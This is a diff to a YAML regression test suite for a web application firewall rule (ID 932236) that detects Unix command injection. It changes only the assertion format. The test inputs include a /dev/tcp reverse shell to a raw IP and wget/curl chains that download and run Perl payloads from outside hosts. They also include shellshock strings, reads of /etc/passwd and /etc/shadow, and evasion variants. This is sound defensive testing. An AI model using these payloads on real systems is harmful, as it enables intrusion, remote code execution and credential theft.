@@ -22,7 +22,8 @@ tests:
           version: HTTP/1.0
           data: ;cp /var/log/apache2/error.log evil.php
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 2
     desc: "Negative test on German numbering - Schauen Sie sich diese Zahl an: 1'000'000"
     stages:
@@ -41,7 +42,8 @@ tests:
             text=Schauen%20Sie%20sich%20diese%20Zahl%20an%3A%201%27000%27000
           version: HTTP/1.1
         output:
-          no_log_contains: id "932236"
+          log:
+            no_expect_ids: [932236]
   - test_id: 3
     desc: "Positive test - BB BBBZARPI - d=/dev&&(sh)0>$d/tcp/51.15.142.164/777"
     stages:
@@ -58,7 +60,8 @@ tests:
           uri: "/get?cmd=d%3D%2Fdev%26%26(sh)0%3E%24d%2Ftcp%2F51.15.142.164%2F777"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 4
     desc: "55O5COJ5"
     stages:
@@ -75,7 +78,8 @@ tests:
             code=;c89 -wrapper sh,-c,id .
           version: HTTP/1.0
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 5
     desc: "55O5COJ5"
     stages:
@@ -92,7 +96,8 @@ tests:
             code=;c89 -wrapper sh,-c,curl\ google.com .
           version: HTTP/1.0
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 6
     desc: "9323HNQU - should not be detected at PL 2"
     stages:
@@ -109,7 +114,8 @@ tests:
             code=;vi dddd +silent\\ \!whoami +wq
           version: HTTP/1.0
         output:
-          no_log_contains: id "932236"
+          log:
+            no_expect_ids: [932236]
   - test_id: 7
     desc: "9323HNQU"
     stages:
@@ -126,7 +132,8 @@ tests:
             code=;vim dddd +silent\\ \!whoami +wq
           version: HTTP/1.0
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 8
     desc: "9323HNQU"
     stages:
@@ -143,7 +150,8 @@ tests:
             code=;ex dddd +silent\\ \!whoami +wq
           version: HTTP/1.0
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 9
     desc: "9323HNQU - should not be detected at PL 2"
     stages:
@@ -160,7 +168,8 @@ tests:
             code=;vi -c:\!pwd
           version: HTTP/1.0
         output:
-          no_log_contains: id "932236"
+          log:
+            no_expect_ids: [932236]
   - test_id: 10
     desc: "9323HNQU"
     stages:
@@ -177,7 +186,8 @@ tests:
             code=;vim -c:\!pwd
           version: HTTP/1.0
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 11
     desc: "9323HNQU"
     stages:
@@ -194,7 +204,8 @@ tests:
             code=;ex -c:\!pwd
           version: HTTP/1.0
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 12
     desc: "ATFHUJVF"
     stages:
@@ -211,7 +222,8 @@ tests:
             code=;gdb -nx -ex \!whoami -ex quit
           version: HTTP/1.0
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 13
     desc: "JW2SU88A"
     stages:
@@ -228,7 +240,8 @@ tests:
           data: |
             code=;cat /path/file.gz
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 14
     desc: "4JOGUXYQ"
     stages:
@@ -245,7 +258,8 @@ tests:
           data: |
             find /etc -name passwd -exec cat {} +
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 15
     desc: "ANQ9SN3S"
     stages:
@@ -262,7 +276,8 @@ tests:
           data: |
             code=flock -u / whoami
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 16
     desc: "JW2SU88A"
     stages:
@@ -279,7 +294,8 @@ tests:
           data: |
             code=cat /path/file.gz
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 17
     desc: "P6E0KY27"
     stages:
@@ -296,7 +312,8 @@ tests:
           data: |
             code=cpulimit -l 100 -f whoami
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 18
     desc: "FP agains 'fi' without word boundary"
     stages:
@@ -311,7 +328,8 @@ tests:
           uri: "/get?field_metatags[0][advanced][rights]=somevalue"
           version: HTTP/1.0
         output:
-          no_log_contains: id "932236"
+          log:
+            no_expect_ids: [932236]
   - test_id: 19
     desc: "FP MailerUI"
     stages:
@@ -326,7 +344,8 @@ tests:
           uri: "/get?args=MailerUI"
           version: HTTP/1.0
         output:
-          no_log_contains: id "932236"
+          log:
+            no_expect_ids: [932236]
   - test_id: 20
     desc: "FP tasksListView"
     stages:
@@ -341,7 +360,8 @@ tests:
           uri: "/get?args=tasksListView"
           version: HTTP/1.0
         output:
-          no_log_contains: id "932236"
+          log:
+            no_expect_ids: [932236]
   - test_id: 21
     desc: System Command Injection (932236) from old modsec regressions
     stages:
@@ -360,7 +380,8 @@ tests:
           uri: "/get?foo=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 22
     desc: System Command Injection (932236) from old modsec regressions
     stages:
@@ -379,7 +400,8 @@ tests:
           uri: "/get?foo=http://ricky.ilmerlodellarocca.com/upload.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;%20appa.jpg;perl%20appa.jpg;rm%20-rf%20appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;mv%20ca.php%20ca.php;chmod%20755%20ca.php"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 23
     desc: arg value of ";ifconfig Something „The Title”. After space or new line more characters" is blocked
     stages:
@@ -398,7 +420,8 @@ tests:
           data: "arg=;top+Something+else+1+%26%238222%3BThe+Title%26%238221%3B.+After+space+or+new+line+more+characters"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 24
     desc: arg value of "Something „The Title”. After ;ifconfig something" is blocked
     stages:
@@ -417,7 +440,8 @@ tests:
           data: "arg=Something+else+2+%26%238222%3BThe+Title%26%238221%3B.+After+%3Btop+something"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 25
     desc: Positive test - RCE passed in one of the args
     stages:
@@ -437,7 +461,8 @@ tests:
             arg1=Something+else+2+%26%238222%3BThe+Title%26%238221%3B.+After+something&arg2=system('dig%20cd%20/tmp;ftp%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;zip%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;tex%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;cut%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 26
     desc: RCE from test 932236.yaml combined with html entities in the middle
     stages:
@@ -456,7 +481,8 @@ tests:
           data: "arg=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;Something+%26%238222%3BThe+Title%26%238221%3B.+After+something;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 27
     desc: RCE from test 932236.yaml combined with html entities at the beginning
     stages:
@@ -475,7 +501,8 @@ tests:
           data: "arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 28
     desc: RCE from test 932236.yaml combined with html entities at the end
     stages:
@@ -494,7 +521,8 @@ tests:
           data: "arg=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf+Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 29
     desc: RCE from https://github.com/payloadbox/command-injection-payload-list combined with html entities
     stages:
@@ -513,7 +541,8 @@ tests:
           data: "arg=&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;&arg2=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 30
     desc: RCE from https://github.com/payloadbox/command-injection-payload-list combined with html entities
     stages:
@@ -532,7 +561,8 @@ tests:
           data: "arg=%0Acat%20/etc/passwd;&arg2=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 31
     desc: RCE from https://github.com/payloadbox/command-injection-payload-list combined with html entities
     stages:
@@ -551,7 +581,8 @@ tests:
           data: "arg=()%20{%20:;};%20/bin/bash%20-c%20\"curl%20http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\\`top%20-a\\`\"&arg2=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 32
     desc: RCE ;top with html entities two digit decimal of 59 (;)
     stages:
@@ -570,7 +601,8 @@ tests:
           data: "arg=%26%2359%3B+;top"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 33
     desc: Like rule True Negative Rule Integrity 9 but the html entity is concatenation with RCE at the end
     stages:
@@ -589,7 +621,8 @@ tests:
           data: "arg=&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;+Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 34
     desc: Like rule True Negative Rule Integrity 9 but the html entity is concatenation with RCE at the beginning
     stages:
@@ -608,7 +641,8 @@ tests:
           data: "arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 35
     desc: Like rule True Negative Rule Integrity 10 but the html entity is concatenation with RCE at the end
     stages:
@@ -627,7 +661,8 @@ tests:
           data: "arg=%0Acat%20/etc/passwd;+Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 36
     desc: Like rule True Negative Rule Integrity 10 but the html entity is concatenation with RCE at the beginning
     stages:
@@ -646,7 +681,8 @@ tests:
           data: "arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+%0Acat%20/etc/passwd;"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 37
     desc: Like rule True Negative Rule Integrity 11 but the html entity is concatenation with RCE at the beginning
     stages:
@@ -665,7 +701,8 @@ tests:
           data: "arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+()%20{%20:;};%20/bin/bash%20-c%20\"ftp%20http://135.23.158.130/.testing/shellshock.txt?vuln=22?dig=\\`top%20-a\\`\""
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 38
     desc: "Unix command injection"
     stages:
@@ -681,7 +718,8 @@ tests:
           data: "var=` /bin/cat /etc/passwd`"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 39
     desc: "Unix command injection"
     stages:
@@ -697,7 +735,8 @@ tests:
           data: "var=`cut crs312``dig 34test`"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 40
     stages:
       - input:
@@ -711,7 +750,8 @@ tests:
           uri: "/get?932236-1=bash%20-c%20%22echo%20test%22"
           version: "HTTP/1.1"
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 41
     stages:
       - input:
@@ -726,7 +766,8 @@ tests:
           uri: "/get"
           version: "HTTP/1.1"
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 42
     desc: Remote Command Injection test for BB finding 935E1D91
     stages:
@@ -743,7 +784,8 @@ tests:
           uri: "/get?foo=time+curl+coreruleset.org"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 43
     desc: Remote Command Injection test for BB finding 935E1D91 - time evasion attempt
     stages:
@@ -760,7 +802,8 @@ tests:
           uri: "/get?foo=ti''me+curl+coreruleset.org"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 44
     desc: "FP with word comment"
     stages:
@@ -775,7 +818,8 @@ tests:
           uri: "/get?args=comment"
           version: HTTP/1.0
         output:
-          no_log_contains: id "932236"
+          log:
+            no_expect_ids: [932236]
   - test_id: 45
     desc: "FP with word settings"
     stages:
@@ -790,7 +834,8 @@ tests:
           uri: "/get?args=settings"
           version: HTTP/1.0
         output:
-          no_log_contains: id "932236"
+          log:
+            no_expect_ids: [932236]
   - test_id: 46
     desc: False positive against "time"
     stages:
@@ -808,7 +853,8 @@ tests:
           data: "var=hello; time he came"
           version: HTTP/1.1
         output:
-          no_log_contains: id "932236"
+          log:
+            no_expect_ids: [932236]
   - test_id: 47
     desc: False positive against "more"
     stages:
@@ -826,7 +872,8 @@ tests:
           data: "var=a hero; more than"
           version: HTTP/1.1
         output:
-          no_log_contains: id "932236"
+          log:
+            no_expect_ids: [932236]
   - test_id: 48
     desc: "FP with word environment"
     stages:
@@ -841,7 +888,8 @@ tests:
           uri: "/get?args=environment"
           version: HTTP/1.0
         output:
-          no_log_contains: id "932236"
+          log:
+            no_expect_ids: [932236]
   - test_id: 49
     desc: "FP with word performance"
     stages:
@@ -856,7 +904,8 @@ tests:
           uri: "/get?args=performance"
           version: HTTP/1.0
         output:
-          no_log_contains: id "932236"
+          log:
+            no_expect_ids: [932236]
   - test_id: 50
     desc: "Block execution of env command with arguments"
     stages:
@@ -872,7 +921,8 @@ tests:
           data: "args=env --version"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 51
     desc: "Block execution of perf command with arguments"
     stages:
@@ -888,7 +938,8 @@ tests:
           data: "args=perf --version"
           version: HTTP/1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 52
     desc: "Block evasion using here string"
     stages:
@@ -905,7 +956,8 @@ tests:
           data: |
             code=;`cat<<<ifconfig`
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 53
     desc: "Block evasion using here string with space"
     stages:
@@ -922,7 +974,8 @@ tests:
           data: |
             code=;`cat<<< ifconfig`
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 54
     desc: "Block evasion using here string with single quotes"
     stages:
@@ -939,7 +992,8 @@ tests:
           data: |
             code=;`cat<<<'ifconfig'`
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 55
     desc: "Block evasion using here string with double quotes"
     stages:
@@ -956,7 +1010,8 @@ tests:
           data: |
             code=;`cat<<<"ifconfig"`
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 56
     desc: "Block evasion using here string with command substitution"
     stages:
@@ -973,7 +1028,8 @@ tests:
           data: |
             code=;`cat<<<$(ifconfig)`
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 57
     desc: "Block `time` prefix"
     stages:
@@ -990,7 +1046,8 @@ tests:
           data: |
             code=time ifconfig
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 58
     desc: "Block `strace` prefix"
     stages:
@@ -1007,7 +1064,8 @@ tests:
           data: |
             code=strace ifconfig
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 59
     desc: "Known false positive with `Cut` at start of string (expected failure)"
     stages:
@@ -1024,7 +1082,8 @@ tests:
           data: |
             sentence=Cut orange quarters into crosswise slices about 1/8-inch thick.
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 60
     desc: "Known false positive with `Wall` at start of string (expected failure)"
     stages:
@@ -1041,7 +1100,8 @@ tests:
           data: |
             sentence=Wall Street\\xe2\\x80\\x99s benchmark stock index struck an all-time high on Tuesday.
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 61
     desc: "Known false positive with `Mount` at start of string (expected failure)"
     stages:
@@ -1058,7 +1118,8 @@ tests:
           data: |
             sentence=Mount Airy basketball coach Bryan Hayes lectures his team during a third-quarter timeout.
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 62
     desc: "Fixed false positive with `As` at start of string"
     stages:
@@ -1075,7 +1136,8 @@ tests:
           data: |
             sentence=As you near your last year of trick or treating, though, sometimes jokes aren't enough.
         output:
-          no_log_contains: id "932236"
+          log:
+            no_expect_ids: [932236]
   - test_id: 63
     desc: "Fixed false positive with `At` at start of string"
     stages:
@@ -1092,7 +1154,8 @@ tests:
           data: |
             sentence=At any moment we can make a decision to change.
         output:
-          no_log_contains: id "932236"
+          log:
+            no_expect_ids: [932236]
   - test_id: 64
     desc: "Block `nohup` prefix"
     stages:
@@ -1109,7 +1172,8 @@ tests:
           data: |
             code=nohup ifconfig
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 65
     desc: "Block ad-hoc ansible commands"
     stages:
@@ -1126,7 +1190,8 @@ tests:
           data: |
             code=ansible all -m ping
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 66
     desc: "Block ansible config dump command"
     stages:
@@ -1143,7 +1208,8 @@ tests:
           data: |
             code=ansible-config dump
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 67
     desc: "Block installing collections from ansible galaxy"
     stages:
@@ -1160,7 +1226,8 @@ tests:
           data: |
             code=ansible-galaxy collection install community.general
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 68
     desc: "Block ad-hoc ansible commands using ansible-console"
     stages:
@@ -1177,7 +1244,8 @@ tests:
           data: |
             code=ansible-console
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 69
     desc: "Block ansible-doc command"
     stages:
@@ -1194,7 +1262,8 @@ tests:
           data: |
             code=ansible-doc plugin ping
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 70
     desc: "Block dumping ansible inventory file and variables"
     stages:
@@ -1211,7 +1280,8 @@ tests:
           data: |
             code=ansible-inventory --list
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 71
     desc: "Block ansible pull from remote repository"
     stages:
@@ -1228,7 +1298,8 @@ tests:
           data: |
             code=ansible-pull --url example.com
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 72
     desc: "Block decrypting ansible secrets"
     stages:
@@ -1245,7 +1316,8 @@ tests:
           data: |
             code=ansible-vault decrypt secret
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 73
     desc: "Block execution of ansible playbooks"
     stages:
@@ -1262,7 +1334,8 @@ tests:
           data: |
             code=ansible-playbook site.yml
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 74
     desc: "Block decryption of secrets with chef-vault"
     stages:
@@ -1279,7 +1352,8 @@ tests:
           data: |
             code=chef-vault -i secret
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 75
     desc: "Block execution of chef-shell command"
     stages:
@@ -1296,7 +1370,8 @@ tests:
           data: |
             code=chef-shell
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 76
     desc: "Block execution chef recipie book"
     stages:
@@ -1313,7 +1388,8 @@ tests:
           data: |
             code=chef-run all recipie.rb
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 77
     desc: "Block execution chef recipie book against a specific node"
     stages:
@@ -1330,7 +1406,8 @@ tests:
           data: |
             code=chef-client -t 1.1.1.1
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 78
     desc: "Block execution chef command"
     stages:
@@ -1347,7 +1424,8 @@ tests:
           data: |
             code=chef report nodes
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 79
     desc: "Block execution of visudo"
     stages:
@@ -1364,7 +1442,8 @@ tests:
           data: |
             code=visudo
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
   - test_id: 80
     desc: "Block execution of CrowdSec cscli"
     stages:
@@ -1381,4 +1460,5 @@ tests:
           data: |
             code=cscli alerts list
         output:
-          log_contains: id "932236"
+          log:
+            expect_ids: [932236]
